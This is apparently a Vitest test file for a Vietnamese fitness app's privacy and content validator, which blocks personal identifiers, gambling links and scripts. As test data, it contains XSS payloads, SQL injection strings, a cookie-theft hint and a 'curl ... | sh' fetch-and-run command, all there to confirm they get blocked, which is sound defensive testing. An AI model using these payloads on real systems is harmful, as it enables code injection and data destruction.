import { describe, expect, it } from "vitest";
import mongoose from "mongoose";
import {
  prepareExternalKnowledgeQuery,
  prepareKnowledgeRetrievalQuery,
  prepareKnowledgeSuggestionPair,
  validateKnowledgeEntryPrivacy,
} from "../knowledgePrivacy.js";

const entry = (overrides = {}) => ({
  question: "Nên tập thế nào để giảm mỡ?",
  answer: "",
  variants: [],
  tags: [],
  sources: [],
  ...overrides,
});
const answerOf = (answer) => entry({ answer });
const variantOf = (text) => entry({ variants: [{ text }] });
const isValid = (value) => validateKnowledgeEntryPrivacy(value).valid;

describe("Knowledge privacy false positives: REQ-001 educational content", () => {
  it.each([
    "Ưu tiên Body Recomposition (Tăng cơ, giảm mỡ cùng lúc).",
    "Áp dụng Progressive Overload (Tăng tải dần) — thêm tạ hoặc reps mỗi tuần.",
    "Có thể dùng Pre-workout, Fat Burner hoặc Whey Protein nhưng không bắt buộc.",
    "Anabolic Window (Cửa sổ hấp thụ) không quan trọng bằng tổng lượng đạm cả ngày.",
    "L-Carnitine không thay thế được thâm hụt calo.",
  ])("AC-001 accepts capitalised fitness terms: %s", (answer) => {
    expect(isValid(answerOf(answer))).toBe(true);
  });

  it.each([
    "Nguồn tham khảo: NASM (National Academy of Sports Medicine) - Nguyên lý Body Recomposition.",
    "Nguồn tham khảo: ACSM, NIH và ISSN.",
    "Theo hướng dẫn của American College of Sports Medicine, nên tập kháng lực 2-3 buổi mỗi tuần.",
  ])("AC-002 accepts well-known organisations and citations: %s", (answer) => {
    expect(isValid(answerOf(answer))).toBe(true);
  });

  it.each([
    "Cardio hỗ trợ tim mạch và giúp tăng sức bền.",
    "Tập kháng lực giúp cải thiện sức khỏe xương khớp.",
  ])("AC-003 accepts medical words in general guidance: %s", (answer) => {
    expect(isValid(answerOf(answer))).toBe(true);
  });
});

describe("Knowledge privacy false positives: names are allowed, phone numbers are not", () => {
  // Chính sách của chủ sở hữu (Plan 112): tên riêng, dù đi cùng bệnh, không bị chặn.
  it.each([
    "Nguyễn Văn An đang áp dụng Body Recomposition và Progressive Overload.",
    "Tôi tên là Phạm Quốc Huy, sống ở Hà Nội và đang tập Mass Gainer.",
    "Bệnh nhân Lê Hoàng Nam bị HIV, nguồn tham khảo: NASM (National Academy of Sports Medicine).",
    "Chị Thanh Hóa là khách của mình, đang học gói 3 tháng.",
    "Viện Lan bị tiểu đường",
    "Minh bị cao huyết áp",
    "học viên hùng bị cao huyết áp",
    "lê thị hoa mắc bệnh tiểu đường",
    "Mẹ tôi tên Lan bị tiểu đường",
    "Khách hàng Nguyễn Văn An bị huyết áp cao thì tập thế nào?",
  ])("accepts a person's name in a knowledge entry and in internal retrieval: %s", (text) => {
    expect(isValid(answerOf(text))).toBe(true);
    expect(isValid(variantOf(text))).toBe(true);
    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(true);
  });

  it("still blocks a phone number next to a general term", () => {
    expect(isValid(answerOf("Khách hàng Trần Thị Bình áp dụng Fat Burner, số điện thoại 0912345678."))).toBe(false);
  });
});

describe("Knowledge privacy false positives: REQ-002 bibliographic identifiers", () => {
  const title =
    "Comparison of two nutritional protocols in body re-composition (DOI: 10.1007/s00421-026-06209-6) (PMID: 41940947)";

  it("AC-004 accepts DOI and PMID inside a source title", () => {
    expect(isValid(entry({ sources: [{ title, publisher: "European Journal of Applied Physiology", url: "https://pubmed.ncbi.nlm.nih.gov/41940947/" }] }))).toBe(true);
  });

  it("AC-004 accepts a doi.org source URL", () => {
    expect(isValid(entry({ sources: [{ title: "Protein timing review", url: "https://doi.org/10.1007/s00421-026-06209-6" }] }))).toBe(true);
  });

  it("AC-004 accepts a long real-world DOI whose suffix starts with zeros", () => {
    expect(isValid(entry({ sources: [{ title: "Sleep and adiposity (DOI: 10.7326/0003-4819-153-7-201010050-00006) (PMID: 20921542)" }] }))).toBe(true);
  });

  it("AC-004 still blocks a phone number disguised as a DOI suffix, in a title or a URL", () => {
    expect(isValid(entry({ sources: [{ title: "Review (DOI: 10.1234/0912345678)" }] }))).toBe(false);
    expect(isValid(entry({ sources: [{ title: "Review", url: "https://doi.org/10.1234/0912345678" }] }))).toBe(false);
  });

  it.each([
    ["url", { title: "Review", url: "https://doi.org/10.1234/x?email=a@b.com" }],
    ["url", { title: "Review", url: "https://doi.org/10.1234/x-0912345678" }],
    ["url", { title: "Review", url: "https://doi.org/10.1234/x?phone=0912345678&cccd=012345678901" }],
    ["url", { title: "Review", url: "https://doi.org/10.1234/x?token=abcdefghijklmnopqrstuvwxyz123456" }],
    ["url", { title: "Review", url: "https://doi.org/10.1234/foo/0912 345 678" }],
    ["title", { title: "DOI:10.1234/x,email=a@b.com" }],
    ["title", { title: "doi:10.1234/x?phone=0912345678" }],
  ])("AC-004 still blocks an identifier hidden behind a DOI label (%s)", (_field, source) => {
    expect(isValid(entry({ sources: [source] }))).toBe(false);
  });

  it.each([
    { title: "Review", url: "https://doi.org/10.1136/bjsports-2020-102955" },
    { title: "Dietary review (DOI: 10.1016/j.jand.2016.01.009)" },
  ])("AC-004 accepts ordinary DOIs: %j", (source) => {
    expect(isValid(entry({ sources: [source] }))).toBe(true);
  });

  it("AC-004 still blocks an unlabeled phone number in a source title", () => {
    expect(isValid(entry({ sources: [{ title: "Review, liên hệ 0912345678" }] }))).toBe(false);
  });

  it.each([
    ["answer", answerOf("Xem DOI: 10.1234/0912345678 để biết thêm.")],
    ["question", entry({ question: "DOI: 10.1007/s00421-026-06209-6 nói gì?" })],
  ])("AC-004 still blocks the same identifiers outside a source title (%s)", (_field, value) => {
    expect(isValid(value)).toBe(false);
  });
});

describe("Knowledge privacy false positives: REQ-003 common self-description", () => {
  it.each([
    "Tôi bị skinny fat thì nên giảm mỡ hay tăng cơ trước?",
    "Em bị béo bụng thì nên tập gì?",
    "Mình bị thừa cân thì nên ăn thế nào?",
    "Tôi bị đau lưng thì tập gym có sao không?",
    "Tôi bị tiểu đường type 2 thì tập thế nào cho an toàn?",
    "Tôi bị cao huyết áp thì có tập tạ được không?",
    "Em bị hen suyễn thì tập cardio thế nào?",
  ])("AC-005 accepts %s as a variant and as an internal search query", (text) => {
    expect(isValid(variantOf(text))).toBe(true);
    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(true);
  });

  it.each([
    "Khách hàng bị huyết áp cao thì tập kháng lực có an toàn không?",
    "Người lớn tuổi bị huyết áp cao nên tránh những bài tập nào?",
    "Khách hàng mắc bệnh hen suyễn có được tập HIIT không?",
    "Khi thiết kế chương trình cho người mắc bệnh tiểu đường tuýp 2, HLV cần theo dõi những gì?",
  ])("AC-005 accepts generic-role guidance about a common condition: %s", (answer) => {
    expect(isValid(answerOf(answer))).toBe(true);
  });

  it.each([
    "Em bị béo bụng, số điện thoại của em là 0912345678.",
    "Mình bị thừa cân, email của mình là an.nguyen@example.com.",
    "Học viên Trần Thị Bình bị tiểu đường, số điện thoại 0912345678.",
    "Tôi bị huyết áp cao, liên hệ tôi qua an.nguyen@example.com.",
    "Tôi ở 25 Nguyễn Huệ, quận 1 và bị đau lưng.",
    "Địa chỉ nhà tôi: 12 Lê Lợi, phường Bến Thành, quận 1.",
    "CCCD của tôi là 012345678901, tôi bị đau lưng.",
    "Số nhà 12 ngõ 5, tôi bị đau lưng.",
    "Nhà tôi ở 123 Main Street, tôi bị đau lưng.",
  ])("AC-006 still blocks the same complaint with a forbidden identifier: %s", (text) => {
    expect(isValid(variantOf(text))).toBe(false);
  });

  it.each([
    "Chỉ số đường huyết 100 đường huyết lúc đói, nên tập nhẹ.",
    "Ăn 2 muỗng đường nâu mỗi ngày không tốt cho người tiểu đường.",
    "Tập 3 buổi, 12 reps mỗi bài, nghỉ 90 giây.",
  ])("AC-006 does not mistake numbers or sugar for an address: %s", (text) => {
    expect(isValid(answerOf(text))).toBe(true);
  });

  it.each([
    "Kết quả xét nghiệm HbA1c của tôi là 8,2% thì tập thế nào?",
    "Tôi đang uống metformin 500mg mỗi ngày thì tập thế nào?",
    "Bác sĩ chẩn đoán tôi bị suy thận độ 3 vào năm ngoái.",
    "Huyết áp của tôi là 150/95 mmHg thì tập thế nào?",
    "Tôi bị tiểu đường và đang uống thuốc metformin mỗi ngày.",
    "Tôi vừa phẫu thuật tim, bao lâu thì tập lại được?",
    "Tôi bị đau ngực khi tập thì có sao không?",
  ])("AC-007 accepts health details that do not identify anyone: %s", (text) => {
    expect(isValid(variantOf(text))).toBe(true);
    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(true);
  });

  it("AC-007 still blocks a self-harm statement", () => {
    expect(isValid(variantOf("Tôi muốn tự tử."))).toBe(false);
  });
});

describe("Knowledge privacy false positives: REQ-004 outbound web queries", () => {
  it.each([
    "Tôi tên là Nguyễn Văn An bị tiểu đường type 2 nên tập gì?",
    "Em bị béo bụng, số điện thoại 0912345678, nên tập gì?",
  ])("AC-008 keeps identifiers out of outbound queries: %s", (query) => {
    const result = prepareExternalKnowledgeQuery(query);
    expect(`${result.query || ""}`).not.toMatch(/Nguyễn Văn An|0912345678/);
  });

  it("AC-008 keeps a purely general question eligible", () => {
    expect(prepareExternalKnowledgeQuery("Skinny Fat là gì?").eligible).toBe(true);
  });
});

// Kết quả rà soát bảo mật độc lập (Plan 112 bước 5): các đầu vào dưới đây từng lọt qua và phải luôn bị chặn.
describe("Knowledge privacy false positives: security review regressions", () => {
  // Ngày sinh và tuổi được cho qua (chủ sở hữu); ý định tự hại vẫn bị chặn ở mục kiến thức và tìm kiếm nội bộ.
  it.each([
    "Tôi bị tiểu đường, sinh ngày 12/03/1990",
    "Tôi bị tiểu đường, sinh năm 1990",
    "Tôi bị tiểu đường, 12/03/1990",
    "Tôi 45 tuổi, bị đau lưng",
  ])("allows a date of birth or age next to a health claim: %s", (text) => {
    expect(isValid(answerOf(text))).toBe(true);
    expect(isValid(variantOf(text))).toBe(true);
    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(true);
  });

  // Bệnh, thuốc, số đo, người thân, chẩn đoán, sự kiện lâm sàng không định danh ai nên được cho qua; trợ lý luôn nhắc hỏi bác sĩ.
  it.each([
    "Mẹ tôi bị tiểu đường",
    "Vợ tôi bị cao huyết áp",
    "Bố tôi bị đau lưng",
    "I was diagnosed with diabetes",
    "Tôi bị đau lưng, bác sĩ chẩn đoán thoát vị",
    "Tôi bị đau lưng sau khi phẫu thuật",
    "Khách hàng bị đau lưng đã phẫu thuật",
    "Tôi bị ung thư vú giai đoạn 2",
    "Tôi bị cao huyết áp, huyết áp của tôi 160/100",
    "Tôi bị đau lưng, uống thuốc Voltaren",
    "Tôi bị đau lưng, dán cao Salonpas",
    "Tôi bị cao huyết áp và đang dùng thuốc huyết áp",
  ])("allows health information that does not identify anyone: %s", (text) => {
    expect(isValid(answerOf(text))).toBe(true);
    expect(isValid(variantOf(text))).toBe(true);
    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(true);
  });

  // Tìm kiếm nội bộ che số điện thoại, email, mã định danh trước khi gửi đi thay vì chặn cả câu.
  it.each([
    ["Tôi bị tiểu đường, email a.b@gmail.com", /a\.b@gmail\.com/],
    ["Tôi bị tiểu đường, CCCD 012345678901", /012345678901/],
    ["Tôi bị tiểu đường, số điện thoại 0912345678", /0912345678/],
    ["Tôi bị tiểu đường, my phone is 0912345678", /0912345678/],
  ])("hides a direct identifier in internal retrieval: %s", (text, leaked) => {
    expect(prepareKnowledgeRetrievalQuery(text).query || "").not.toMatch(leaked);
  });

  it.each([
    "Viện Nguyễn Văn An 0912345678 hỏi về squat",
    "Tôi muốn tìm Hội Lan",
    "Trung tâm Hùng có lịch tập không",
    "Tôi tập với Trường Minh",
    "Viện Lan tập squat",
    "Hùng Deadlift 100kg",
    "Viện Lan Anh, sdt 0912345678",
  ])("keeps a person's name out of external search queries: %s", (text) => {
    expect(prepareExternalKnowledgeQuery(text).eligible).toBe(false);
  });

  it("hides a full name next to an organisation prefix in AI Suggest", () => {
    const prepared = prepareKnowledgeSuggestionPair({
      conversationId: new mongoose.Types.ObjectId(),
      question: { _id: new mongoose.Types.ObjectId(), role: "user", content: "Viện Nguyễn Văn An 0912345678 hỏi về squat", timestamp: new Date("2026-09-12T01:00:00.000Z") },
      answer: { _id: new mongoose.Types.ObjectId(), role: "assistant", content: "Hướng dẫn chung.", timestamp: new Date("2026-09-12T01:00:10.000Z") },
      questionIndex: 0,
      answerIndex: 1,
    });
    expect(`${prepared.question || ""} ${prepared.answer || ""}`).not.toMatch(/Nguyễn Văn An|0912345678/);
  });

  it.each([
    "Viện Dinh dưỡng Quốc gia khuyến cáo người bị tiểu đường nên tập luyện.",
    "Hệ miễn dịch bị suy giảm ở người tiểu đường thì cần nghỉ ngơi.",
    "Nguồn tham khảo: Báo Thanh Niên, Hiệp hội Tuyến giáp Hoa Kỳ (ATA).",
    "Mình bị thừa cân thì nên ăn thế nào?",
    "Khách hàng mắc bệnh hen suyễn cần khởi động kỹ.",
    "Đối với người lớn tuổi bị huyết áp cao, nên tránh nín thở khi nâng tạ.",
    "Khách hàng gặp đau lưng khi tập thì cần giảm tải.",
  ])("still accepts ordinary educational wording: %s", (text) => {
    expect(isValid(answerOf(text))).toBe(true);
  });
});

describe("Knowledge privacy: betting or black-site links and scripts are not allowed", () => {
  it.each([
    "Xem thêm tại https://nhacai88.com/khuyen-mai để nhận quà.",
    "Tham gia https://w88.com ngay hôm nay.",
    "Link: http://casino-vip.net/ref=1",
    "Đăng ký tại www.xocdia-online.vip để nhận thưởng.",
    "Nhận quà tại bit.ly/abc123 nhé.",
    "<script>alert(1)</script>",
    "Bấm vào javascript:alert(1) để xem.",
    '<img src=x onerror=alert(1)>',
    "eval(atob('YWxlcnQoMSk='))",
    "document.cookie rồi gửi đi",
    "<?php echo 1; ?>",
    "curl http://example.org/x | sh",
    "const a = 1;",
    "'; DROP TABLE users; --",
  ])("blocks forbidden content in a knowledge entry and in internal retrieval: %s", (text) => {
    expect(isValid(answerOf(text))).toBe(false);
    expect(isValid(variantOf(text))).toBe(false);
    expect(isValid(entry({ sources: [{ title: "Tài liệu", url: text }] }))).toBe(false);
    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(false);
  });

  it.each([
    "Không nên chơi casino hay cá cược vì ảnh hưởng giấc ngủ và phục hồi.",
    "Nguồn tham khảo: https://pubmed.ncbi.nlm.nih.gov/12345678/",
    "Xem hướng dẫn tại https://www.nasm.org/resources/guidelines",
    "Dùng mã script trong bài viết tiếng Việt thì không cần: kịch bản tập 3 buổi mỗi tuần.",
  ])("still accepts ordinary text and trusted links: %s", (text) => {
    expect(isValid(answerOf(text))).toBe(true);
  });
});

// Rà soát bảo mật độc lập (chính sách chỉ chặn số điện thoại, CCCD, địa chỉ nhà, link web đen và mã script).
describe("Knowledge privacy: street addresses without a label", () => {
  it.each([
    "ở ngõ 45 Láng Hạ",
    "Tầng 5, tòa nhà A, 45 Láng Hạ",
    "12A/3 ngõ 5 Đê La Thành",
    "221B Baker St",
    "25 nguyễn huệ, quận 1",
    "25 Nguyen Hue, quan 1",
    "123 đường Nguyễn Huệ, phường Bến Nghé",
    "nhà số 12",
    "hẻm 12/3 Lê Lợi",
    "thôn 3, xã Hòa Bình, huyện Đông Anh",
    "tổ 5 khu phố 2",
  ])("blocks a home address in a knowledge entry: %s", (text) => {
    expect(isValid(answerOf(`Mình ${text}.`))).toBe(false);
    expect(isValid(variantOf(`Mình ${text}.`))).toBe(false);
  });

  it.each([
    "Chỉ số 100 Đường Huyết lúc đói là mức tham khảo.",
    "Chương trình 8 Week Program Rd cho người mới.",
    "Tập 12 Lần Squat, Tỉnh Táo nhé.",
    "Bài 5 Đường Dẫn Ngực giúp mở vai.",
    "Xã hội hóa thể thao, tỉnh táo hơn sau tập 3 buổi.",
  ])("does not mistake ordinary fitness wording for an address: %s", (text) => {
    expect(isValid(answerOf(text))).toBe(true);
  });
});

describe("Knowledge privacy: disguised black links and script variants", () => {
  it.each([
    "https://nha​cai88.com/vao",
    "nhacai88[.]com",
    "hxxps://nhacai88[.]com/x",
    "nhacai88。com",
    "nhacai88 . com",
    "https://example.com/%6Eh%61cai88",
    "kubet.ws",
    "w88vip.tv",
    "nhacai88.tk",
    "8xbet.com",
    "https://bit.ly",
    "https://s.id/abc",
    "https://lnkd.in/abc",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "java\nscript:alert(1)",
    "<div onmouseenter=alert(1)>",
    "<div onpointerdown=alert(1)>",
    "width: expression(alert(1))",
    "atob('YWxlcnQoMSk=')",
    "setTimeout('alert(1)',1)",
    "el.innerHTML = x",
    "' OR 1=1 --",
  ])("blocks %j in a knowledge entry and in internal retrieval", (text) => {
    expect(isValid(answerOf(text))).toBe(false);
    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(false);
  });

  it.each([
    "Xem chương trình tại https://example.com/slots-training",
    "Tham khảo https://acsm.org/slot-machines-and-sleep",
    "Ví dụ: const x = 5 reps",
    "let x = 3 sets rồi nghỉ 90 giây",
    "Dùng onload = nothing",
    "Kết nối https://sportsmed.org/sex-differences-in-training",
    "Nguồn: https://www.who.int/news-room/fact-sheets/detail/physical-activity",
  ])("keeps ordinary text and trusted links valid: %s", (text) => {
    expect(isValid(answerOf(text))).toBe(true);
  });

  it("inspects only a bounded amount of text so a hostile entry cannot stall validation", () => {
    const hostile = { question: "Tập squat thế nào?", answer: "a.".repeat(2500) + "curl ".repeat(900) };
    const started = Date.now();
    validateKnowledgeEntryPrivacy(hostile);
    expect(Date.now() - started).toBeLessThan(2000);
  });
});
